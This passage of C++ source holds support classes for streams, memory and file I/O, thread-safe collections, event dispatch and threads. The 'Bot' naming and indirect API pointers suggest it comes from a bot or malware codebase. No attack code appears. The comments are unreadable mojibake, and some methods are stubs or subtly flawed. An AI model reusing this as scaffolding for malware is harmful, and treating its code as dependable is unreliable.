    {
		PMemBlock Block = (PMemBlock)List::GetItem(Blocks, i);
		if (Block->Size == 0 || Block->Data == NULL) continue;

		if (!Method(Key, (LPBYTE)Block->Data, Block->Size, &Block->Size))
			return false;
	}
    return true;
}


//*****************************************************************************
//                        TEventContainer
//*****************************************************************************

 TEventContainer::TEventContainer()
 {
	FEvents = NULL;
    pInitializeCriticalSection(&FLock);
 }

TEventContainer::~TEventContainer()
{
	if (FEvents) delete FEvents;
	pDeleteCriticalSection(&FLock);
}



// ���������� � �������
struct TEventItem
{
	int ID;
	TBotEvent Event;
	LPVOID    Data;
};

void FreeEventItem(TBotList*, LPVOID Item)
{
	FreeStruct(Item);
}


//-----------------------------------------------------
//  AttachEvent - ������� ���������� ������� �
//                ���������� �������
//-----------------------------------------------------
int TEventContainer::AttachEvent(int EventId, TBotEvent Event, LPVOID EventData)
{
	// ���������� �������
	if (Event == NULL) return NULL;


	if (FEvents == NULL)
	{
		FEvents = new TBotList();
		FEvents->OnDelete = FreeEventItem;
	}

	// ���������  ������� ������ ������� � ������
	for (int i = 0; i < FEvents->Count(); i++)
	{
		TEventItem* Item = (TEventItem*)FEvents->GetItem(i);
		if (Item->ID == EventId && Item->Event == Event)
			return i;
	}

	int Index = -1;
	TEventItem* Item = CreateStruct(TEventItem);
	if (Item)
	{
		Item->ID    = EventId;
		Item->Event = Event;
		Item->Data  = EventData;
		Index = FEvents->Add(Item);
	}
	return Index;
}

//-----------------------------------------------------
//  DetachEvent - ������� ��������� ������� ��
//                ���������� �������
//-----------------------------------------------------
void TEventContainer::DetachEvent(int EventIndex)
{
	// ��������� �������
	if (FEvents && EventIndex >= 0 && EventIndex < FEvents->Count())
	{
		TEventItem* Item = (TEventItem*)FEvents->GetItem(EventIndex);
		if (Item)
		{
			FEvents->SetItem(EventIndex, NULL);
			FreeStruct(Item);
		}
    }
}

//-----------------------------------------------------
//  CallEvent - ������� �������� ��������� �������
//-----------------------------------------------------
void TEventContainer::CallEvent(int EventId, LPVOID Param)
{
	// �������� �������
	if (FEvents)
	{
		for (int i = 0; i < FEvents->Count(); i++)
		{
			TEventItem *Item = (TEventItem*)FEvents->GetItem(i);
			if (Item->ID == 0 || Item->ID == EventId)
			{
            	Item->Event(this, EventId, Item->Data, Param);
            }
		}
    }
}


void TEventContainer::CallEvent(int EventId)
{
	CallEvent(EventId, NULL);
}

//*****************************************************************************
//                        TLock
//*****************************************************************************
TLock::TLock(PRTL_CRITICAL_SECTION Section)
{
	FSection = Section;
	if (FSection)
		pEnterCriticalSection(FSection);
}


TLock::~TLock()
{
	if (FSection)
		pLeaveCriticalSection(FSection);
}

TLock TLock::operator=(const TLock &Locker)
{
	return TLock(Locker.FSection);
}

TLock TLock::operator=(PRTL_CRITICAL_SECTION Section)
{
	return TLock(Section);
}



//****************************************************************************
//  							TBotStream
//****************************************************************************
DWORD TBotStream::Size()
{
	return 0;
}

void TBotStream::SetSize(DWORD NewSize)
{

}

DWORD TBotStream::Seek(int Count, DWORD SeekMethod)
{
	return 0;
}

DWORD TBotStream::Position()
{
	return Seek(0, SO_CURRENT);
}

void  TBotStream::SetPosition(DWORD NewPosition)
{
	Seek(NewPosition, SO_BEGIN);
}

DWORD TBotStream::Write(const void* Buf, DWORD Count)
{
	return 0;
}

DWORD TBotStream::Read(void* Buf, DWORD Count)
{
	return 0;
}


DWORD TBotStream::WriteString(const char* Str)
{
    return Write((LPVOID)Str, STRA::Length(Str));
}

DWORD TBotStream::WriteString(const string &Str)
{
	return Write(Str.t_str(), Str.Length());
}

//-----------------------------------------------------------
//  WriteSizedString - ������� ���������� ������ � ����������
//                     �������
//  ������ [DWORD: ������][������ ������]
//-----------------------------------------------------------
DWORD TBotStream::WriteSizedString(const char* Str)
{
	DWORD Size = STRA::Length(Str);
	DWORD W =  Write(&Size, sizeof(Size));
		  W += Write(Str, Size);
	return W;
}

DWORD TBotStream::WriteSizedString(const string &Str)
{
	DWORD Size = Str.Length();
	DWORD W =  Write(&Size, sizeof(Size));
		  W += Write(Str.t_str(), Size);
	return W;
}


//-----------------------------------------------------------
//  ReadToBuf - ������� ��������� ������ � �����
//-------------------+----------------------------------------
LPVOID TBotStream::ReadToBuf(DWORD *aSize)
{
	DWORD Count = Size() - Position();

	LPVOID Buf = MemAlloc(Count);
	if (Buf)
		Count = Read(Buf, Count);

	if (aSize) *aSize = Count;
	return Buf;
}

//-----------------------------------------------------------
//  ReadToString - ������� ��������� ������ � ������
//-----------------------------------------------------------
string TBotStream::ReadToString()
{
	string Result;

	DWORD Count = Size() - Position();

	if (Count)
	{
        Result.SetLength(Count);
		Count = Read(Result.t_str(), Count);
		Result.SetLength(Count);
    }

	return Result;
}


int TBotStream::ReadInt()
{
	int R = 0;
	Read(&R, sizeof(R));
	return R;
}

BYTE TBotStream::ReadByte()
{
	BYTE R = 0;
	Read(&R, sizeof(R));
	return R;
}

string TBotStream::ReadString(DWORD Size)
{
	string R;
	R.SetLength(Size);
    Read(R.t_str(), Size);
	return R;
}

string TBotStream::ReadSizedString()
{
	// ������ ������ ������� [DWORD: ������][������]
	DWORD Size = 0;
	Read(&Size, sizeof(Size));
	string S;
	S.SetLength(Size);
	if (Size)
	{
		Size = Read(S.t_str(), Size);
		S.SetLength(Size);
    }
	return S;
}


//*****************************************************************************
//                        TBotMemoryStream
//*****************************************************************************
TBotMemoryStream::TBotMemoryStream(LPVOID Mem, DWORD MemSize)
{
	FMemory   = (LPBYTE)Mem;
	FSize     = MemSize;
	FPosition = 0;
	// ������������� ������� ����, ��� ����� ������ � ������� �������
	// � ���� ������ ����� �� ����� ������������ ������
	FAssigned = true;
}

TBotMemoryStream::TBotMemoryStream()
{
	FMemory   = NULL;
	FSize     = 0;
	FPosition = 0;
	FCapacity = 0;
    FAssigned = false;
}

TBotMemoryStream::~TBotMemoryStream()
{
	if (FMemory && !FAssigned)
        MemFree(FMemory);
}

void TBotMemoryStream::SetPointer(LPBYTE Ptr, DWORD Size)
{
	FMemory = Ptr;
    FSize   = Size;
}

LPBYTE TBotMemoryStream::Realloc(DWORD &NewCapacity)
{
	// �������� ������.
	// ������ �������� �������

	if (FAssigned || NewCapacity == FSize)
	{
        NewCapacity = FCapacity;
		return FMemory;
    }

	// ��������������� ������� ��������, ����������� ������
	if (NewCapacity == 0)
	{
		if (FMemory)
		{
			MemFree(FMemory);
			FMemory = NULL;
			FPosition = 0;
			FSize = 0;
        }
        return FMemory;
    }

	/* TODO : ��������� ����������� ��������� ������ */
	const static WORD BlockSize = 4096;

    LPBYTE Buf = FMemory;

	NewCapacity = ((NewCapacity / BlockSize) + 1) * BlockSize;
	if (FCapacity != NewCapacity)
	{
		if (!Buf)
			Buf = (LPBYTE)MemAlloc(NewCapacity);
		else
			Buf = (LPBYTE)MemRealloc(Buf, NewCapacity);
	}

	return Buf;
}


void TBotMemoryStream::SetCapacity(DWORD NewCapacity)
{
	FMemory = Realloc(NewCapacity);
	FCapacity = NewCapacity;
}


void TBotMemoryStream::SetSize(DWORD NewSize)
{
	if (!FAssigned)
	{
		DWORD Old = FSize;
		SetCapacity(NewSize);
		FSize = NewSize;
		if (Position() > NewSize)
            Seek(NewSize, SO_BEGIN);
    }
}


DWORD TBotMemoryStream::Read(void* Buf, DWORD Count)
{
	// ������ ������ ������
	DWORD Readed = 0;

	if (FMemory)
	{
        Readed = Min(Count, FSize - FPosition);
		m_memcpy(Buf, FMemory + FPosition, Readed);
		FPosition += Readed;
    }
	return Readed;
}

DWORD TBotMemoryStream::Write(const void* Buf, DWORD Count)
{
	if (!Buf || !Count) return 0;


	DWORD Writen = 0;

    // ���������� ������ ������������ ������
	if (FAssigned)
	{
		Writen = (FMemory) ? Min(Count, FSize - FPosition) : 0;
	}
	else
	{
		DWORD MaxSize = FSize + Count;
		if (MaxSize > FSize)
		{
			if (MaxSize > FCapacity)
				SetCapacity(MaxSize);
            FSize = MaxSize;
		}
		Writen = (FMemory) ? Count : 0;
    }

	// ���������� ������
	if (Writen)
	{
        m_memcpy(FMemory + FPosition, Buf, Writen);
        FPosition += Writen;
    }

	return Writen;
}


DWORD TBotMemoryStream::Size()
{
    return FSize;
}


DWORD TBotMemoryStream::Seek(int Count, DWORD SeekMethod)
{
	if (FMemory)
	{
		switch (SeekMethod) {
			case SO_BEGIN:   FPosition =  Min(Count, FSize); break;
			case SO_CURRENT: FPosition += Min(Count, FSize - FPosition); break;
			case SO_END:     FPosition -= (Count <= FPosition) ? Count : FPosition; break;
		}
    }
	return FPosition;
}


LPVOID TBotMemoryStream::Memory()
{
	return FMemory;
}



//****************************************************************************
//  									TBotFileStream
//****************************************************************************
TBotFileStream::TBotFileStream(const char* FileName, WORD Mode)
{
	DWORD Access   = GENERIC_READ;

	bool Create = (Mode & fcmCreate) != 0;

	DWORD Creation = (Create) ? CREATE_ALWAYS : OPEN_EXISTING;
	// ���������� ����� ������\������

	WORD AM = Mode & 0x0003;
	if (AM == 0 && Create)
	{
        Access   = GENERIC_WRITE;
	}
	else
	{
		switch (AM)
		{
			case fcmWrite: Access   = GENERIC_WRITE; break;
			case fcmReadWrite: Access |= GENERIC_WRITE; break;
		}
    }


	FHandle = (HANDLE)pCreateFileA(FileName, Access, 0, NULL, Creation, FILE_ATTRIBUTE_NORMAL, NULL);
	if (FHandle == INVALID_HANDLE_VALUE)
		FHandle = NULL;
}


TBotFileStream::~TBotFileStream()
{
	Close();
}

bool TBotFileStream::Valid()
{
	// ������� ���������� ������ ���� ���� ������� ������
    return FHandle != NULL;
}


void TBotFileStream::Close()
{
	if (FHandle)
	{
		pCloseHandle(FHandle);
		FHandle = NULL;
    }
}

DWORD TBotFileStream::Write(const void* Buf, DWORD Count)
{
	DWORD Size = 0;
	if (FHandle)
		pWriteFile(FHandle, Buf, Count, &Size, NULL);
	return Size;
}

DWORD TBotFileStream::Read(void* Buf, DWORD Count)
{
	DWORD Size = 0;
	if (FHandle)
		pReadFile(FHandle, Buf, Count, &Size, NULL);
	return Size;
}


DWORD TBotFileStream::Seek(int Count, DWORD MoveMethod)
{
	return (FHandle) ? (LONG)pSetFilePointer(FHandle, Count, NULL, MoveMethod) : 0;
}


DWORD TBotFileStream::Size()
{
	return (FHandle) ? (DWORD)pGetFileSize(FHandle, NULL) : 0;
}


void TBotFileStream::SetSize(DWORD NewSize)
{
	// ������� ������������� ����� ������ �����
	if (FHandle)
	{
		  Seek(NewSize, SO_BEGIN);
		  pSetEndOfFile(FHandle);
    }
}



//*****************************************************************************
//                        TBotCollection
//*****************************************************************************

TBotCollection::TBotCollection()
{
	FLock = NULL;
}

TBotCollection::~TBotCollection()
{
	Clear();

	if (FLock)
	{
		pDeleteCriticalSection(FLock);
		FreeStruct(FLock);
	}
}


// �� ��������� ��������� �������� ������ �� ����������
// ��� ��������� ������������������ ���������� ������� ������ �������
// �������������� ������� ������ ���������� �� ������ ������ � �������
void TBotCollection::SetThreadSafe()
{
	if (!FLock)
	{
		FLock = CreateStruct(RTL_CRITICAL_SECTION);
		pInitializeCriticalSection(FLock);
    }
}

// ���� � ����������� ������
void TBotCollection::Lock()
{
	if (FLock)
        pEnterCriticalSection(FLock);
}

// ����� �� ����������� ������
void TBotCollection::Unlock()
{
	if (FLock)
        pLeaveCriticalSection(FLock);
}

// ������� ������ � ����������� ������ � ���������� ������ ����������
TLock TBotCollection::GetLocker()
{
	return FLock;
}


// ��������� ������� � ���������
void TBotCollection::InsertItem(TBotCollectionItem* Item)
{
	if (Item && Item->FOwner != this)
	{
		// ��������� ������� �� ������ ���������
		if (Item->FOwner) Item->FOwner->RemoveItem(Item);

		// ��������� �����
		TLock Lock(FLock);
		//--------------------------------

		FItems.Add(Item);
		Item->FOwner = this;
    }
}

//��������� ������� �� ���������
void TBotCollection::RemoveItem(TBotCollectionItem* Item)
{
	if (Item && Item->FOwner == this)
	{
		// ��������� �����
		TLock Lock(FLock);
		//--------------------------------

		FItems.Remove(Item);
		Item->FOwner = NULL;
    }
}


// ������� ������� ������ ���������
void TBotCollection::Clear()
{
	// ��������� �����
	TLock Lock(FLock);
    //--------------------------------

	for (int i = 0; i < FItems.Count(); i++)
	{
	   TBotCollectionItem* Item = (TBotCollectionItem*)FItems.GetItem(i);
	   Item->FOwner = NULL;
       delete Item;
	}

	FItems.Clear();
}


// ������� ���������� ���������� ��������� ������
int TBotCollection::Count()
{
	// ��������� �����
	TLock Lock(FLock);
	//--------------------------------

	return FItems.Count();
}

// ������� ���������� ������������� �������
TBotCollectionItem* TBotCollection::Items(int Index)
{
	// ��������� �����
	TLock Lock(FLock);
	//--------------------------------

    return (TBotCollectionItem*)FItems.GetItem(Index);
}


//*****************************************************************************
//                        TBotCollectionItem
//*****************************************************************************

TBotCollectionItem::TBotCollectionItem(TBotCollection* aOwner)
{
	FOwner = NULL;
	if (aOwner) aOwner->InsertItem(this);
}

TBotCollectionItem::~TBotCollectionItem()
{
	if (FOwner) FOwner->RemoveItem(this);
}


void TBotCollectionItem::Lock()
{
	if (FOwner) FOwner->Lock();
}

void TBotCollectionItem::Unlock()
{
	if (FOwner) FOwner->Unlock();
}

TBotCollection* TBotCollectionItem::Owner()
{
	return FOwner;
}

// ������� ������������� ��������� ��������
void TBotCollectionItem::SetOwner(TBotCollection* aOwner)
{
	if (aOwner)
		aOwner->InsertItem(this);
	else
	if (FOwner)
    	FOwner->RemoveItem(this);
}



//*****************************************************************************
//                            TValues
//*****************************************************************************


TValues::TValues()
	: TBotCollection()
{
}

// ������� ���������� ������� �� ��� �����
TValue* TValues::GetItemByName(const char* Name)
{
	int Cnt = Count();
	for (int i = 0; i < Cnt; i++)
	{
		TValue* V = (TValue*)Items(i);
		if (V->Name == Name)
			return V;
	}
	return NULL;
}

void TValues::AddValue(const string &Name, const string &Value)
{
	TValue* V = new TValue(NULL);
	V->Name  = Name;
	V->Value = Value;
	V->SetOwner(this);
}

void TValues::SetValue(int Index, const string &Value)
{
	((TValue*)Items(Index))->Value = Value;
}

// ������������� ��������
void TValues::SetValue(const char* Name, const string &Value)
{
	TValue* V = GetItemByName(Name);
	if (V)
		V->Value = Value;
	else
		AddValue(Name, Value);
}


// ������� �������� �� �������
string TValues::GetValue(int Index)
{
    return ((TValue*)Items(Index))->Value;
}


// ������� �������� �� �����
string TValues::GetValue(const char *Name)
{
	TValue* V = GetItemByName(Name);
	if (V)
		return V->Value;
	else
        return string(NULLSTR);
}


//*****************************************************************************
//                          		TDataFile
//*****************************************************************************


//----------------------------------
//  ���������� ������
//----------------------------------
#pragma pack(push, 1)
struct TDataHeader
{
	DWORD Type;      // ��� ������
	DWORD Flags;     // ����� ������
	DWORD FlagsEx;   // �������������� �����
	BYTE  Encrypted; // ������ �����������
	BYTE  Signed;    // ������� ����, ��� ������ ��������� �������� ��������
	DWORD NameLen;   // ����� ����� �������
};
#pragma pack(pop)


//----------------------------------
//  ���������� ����� ������
//----------------------------------
#pragma pack(push, 1)
struct TDataBlockHeader
{
	WORD  Type;      // ��� �����
    DWORD Size;      // ������ ������
	DWORD NameID;    // ������������� (� ����������� �� ���� ����� ��������� ����������)
	DWORD Reserved;  // ���������������

};
#pragma pack(pop)





TDataFile::TDataFile()
{
	FStream = NULL;
	FStreamAssigned = false;
	Signature = DATA_FILE_SIGNATURE;
	Version   = DATA_FILE_VERSION;
	Type      = 0;
	Flags     = 0;
	FlagsEx   = 0;
}


TDataFile::~TDataFile()
{
	Close();
}

//-------------------------------------------------------
//  Close - ������� ��������� ������
//-------------------------------------------------------
void TDataFile::Close()
{
	Name.Clear();
	Type    = 0;
	Flags   = 0;
	FlagsEx = 0;

	if (FStream)
	{
		if (!FStreamAssigned)
			delete FStream;
		FStream = NULL;
		FStreamAssigned = false;
    }
}

//-------------------------------------------------------
//  ������� ������ ����� ������ � �����
//-------------------------------------------------------
bool TDataFile::Create(const char* FileName)
{
	bool R = false;
	Close();
	if (!STRA::IsEmpty(FileName))
	{
		TBotFileStream *S = new TBotFileStream(FileName, fcmReadWrite | fcmCreate);
		R = Create(S);
		FStreamAssigned = false;
		if (!R) delete S;
	}
	return R;
}

//-------------------------------------------------------
//  ������� ������ ����� ������ � ������ ������
//-------------------------------------------------------
bool TDataFile::Create(TBotStream *Stream)
{
	Close();
	FStream = Stream;
	FStreamAssigned = FStream != NULL;
	bool R = false;
	if (FStream)
    {
		R = WriteHeaders();
		if (!R) Close();
    }
	return R;
}

//-------------------------------------------------------
// ������� ��������� ����� ������ �� �����
//-------------------------------------------------------
bool TDataFile::Open(const char* FileName)
{
	Close();
	if (STRA::IsEmpty(FileName))
		return false;

	TBotFileStream *S = new TBotFileStream(FileName, fcmRead);
	bool R = Open(S);
    FStreamAssigned = false;
	if (!R) delete S;
	return R;
}

//-------------------------------------------------------
//  ������� ��������� ����� ������ ������ ������
//-------------------------------------------------------
bool TDataFile::Open(TBotStream *Stream)
{
	Close();
	// ������ ��������� �����
	FStream = Stream;
	FStreamAssigned = FStream != NULL;

	bool R = false;
	if (FStream)
	{
		R = ReadHeaders();
		if (!R) Close();
    }

	return R;
}

//-------------------------------------------------------
//  ������� ���������� ��������� ������
//-------------------------------------------------------
bool TDataFile::WriteHeaders()
{
	// ���������� ��������� � ������
	TFileHeader H;
	H.Signature = Signature;
	H.Version   = Version;
	bool R = Write(&H, sizeof(H), false, false);

	// ���������� ��������� ������
	TDataHeader DH;
	ClearStruct(DH);
	DH.Type    = Type;
	DH.Flags   = Flags;
	DH.FlagsEx = FlagsEx;
	DH.NameLen = Name.Length();
	R = R && Write(&DH, sizeof(DH), false, false);

	// ���������� ��� ������
	if (R && DH.NameLen)
		R = Write(Name.t_str(), Name.Length(), true, false);

	return R;
}

//-------------------------------------------------------
//  ReadHeaders - ������� ������ ��������� �����
//-------------------------------------------------------
bool TDataFile::ReadHeaders()
{
	TFileHeader H;
	bool R = Read(&H, sizeof(H), false, false);

	/* TODO : ������������ �������� ������ */
	if (!R || H.Signature != Signature || H.Version != Version)
		return false;


	// ������ ��������� ������
	TDataHeader DH;
	R = Read(&DH, sizeof(DH), false, false);

	if (R)
	{
        Type    = DH.Type;
		Flags   = DH.Flags;
		FlagsEx = DH.FlagsEx;

		if (DH.NameLen)
		{
			Name.SetLength(DH.NameLen);
			R = Read(Name.t_str(), DH.NameLen, true, false);
		}
	}
	return R;
}


//-------------------------------------------------------
//  ������� ���������� ������ � �����.
//  Encrypt - �������� ��������� ��� ��� ������������
//			  ������
//  Hash - �������� ���������� ������. ���������� ���
//		   �������� �������
//-------------------------------------------------------
bool TDataFile::Write(const void* Buf, DWORD BufSize, bool Encrypt, bool Hash)
{
	bool R = false;
	if (FStream && Buf && BufSize)
	{
		// ������� ������. ���������������

		// �������� ������. ���������������

		// ���������� ������
		R = FStream->Write(Buf, BufSize) == BufSize;
    }
	return R;
}

//-------------------------------------------------------
//  ������� ������ ������ �� ������
//  Decrypt - �������� ������������ ��� ��� ������������
//			  ������
//  Hash - �������� ���������� ������. ���������� ���
//		   �������� �������
//-------------------------------------------------------
bool TDataFile::Read(void* Buf, DWORD BufSize, bool Decrypt, bool Hash)
{
	bool R = false;
	if (FStream && Buf && BufSize)
	{
		// ������ ������
		R = FStream->Read(Buf, BufSize) == BufSize;

		// �������������� ������. ���������������

		// �������� ������. ���������������
	}
	return R;
}


//-------------------------------------------------------
//  ������� ���������� ���� ������
//  Type       - ��� ������
//  VarName    - ��� ����� ������
//  VarNameLen - ����� �����
//  Data       - ��������� �� ����� � �������
//  DataSize   - ������ ������
//-------------------------------------------------------
bool TDataFile::Add(WORD Type, const char *Name, LPVOID Data, DWORD DataSize)
{
	if (!Data || !DataSize) return false;

	TDataBlockHeader H;
	ClearStruct(H);

	H.Type = Type;
	H.Size = DataSize;

	// ���������� ���������
	bool R = Write(&H, sizeof(H), false, false);

	// ���������� ������
	R = R && Write(Data, DataSize, true, true);
	return R;
}


//-------------------------------------------------------
//  WriteBlock - ������� ���������� ���� � ����� ������
//-------------------------------------------------------
bool TDataFile::WriteBlock(const TDataBlock &Block)
{
	// ��������� ��������� � ���������� ���

	return false;
}

bool TDataFile::ReadBlock(const TDataBlock &Block)
{
	return false;
}




//****************************************************************************
//                                TBotThread
//****************************************************************************


DWORD WINAPI __BotThreadProcedure(LPVOID Owner)
{
	// ������� ������
    ((TBotThread*)Owner)->Execute();
	return 0;
}
//------------------------------------------------------------

TBotThread::TBotThread(bool StartThread)
{
	FTerminated = false;

	if (StartThread)
		Start();
}
//------------------------------------------------------------


TBotThread::~TBotThread()
{
	if (FHandle)
	{
		Terminate();
		Wait();
    }
}
//------------------------------------------------------------

void TBotThread::Execute()
{
	DoExecute();
	FHandle = NULL;
}
//------------------------------------------------------------

void TBotThread::DoExecute()
{

}
//------------------------------------------------------------

void TBotThread::Start()
{
	if (!FHandle)
		FHandle = (HANDLE)pCreateThread(NULL, NULL, __BotThreadProcedure, this, NULL, &FId);
}
//------------------------------------------------------------

void TBotThread::Terminate()
{
	FTerminated = true;
}
//------------------------------------------------------------

bool TBotThread::Terminated()
{
	return FTerminated;
}
//------------------------------------------------------------

void TBotThread::Wait()
{
	// ������� ������� ���������� ������
	if (FHandle)
		pWaitForSingleObject(FHandle, INFINITE);
}
